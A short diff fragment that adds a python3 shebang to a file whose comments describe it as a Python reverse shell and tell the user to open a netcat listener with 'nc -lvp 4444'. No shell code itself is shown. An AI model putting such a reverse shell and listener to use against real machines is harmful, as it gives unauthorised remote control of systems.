@@ -1,3 +1,4 @@
+#!/usr/bin/python3
 # a python reverse shell
 # set up a netcat listner
 # nc -lvp 4444
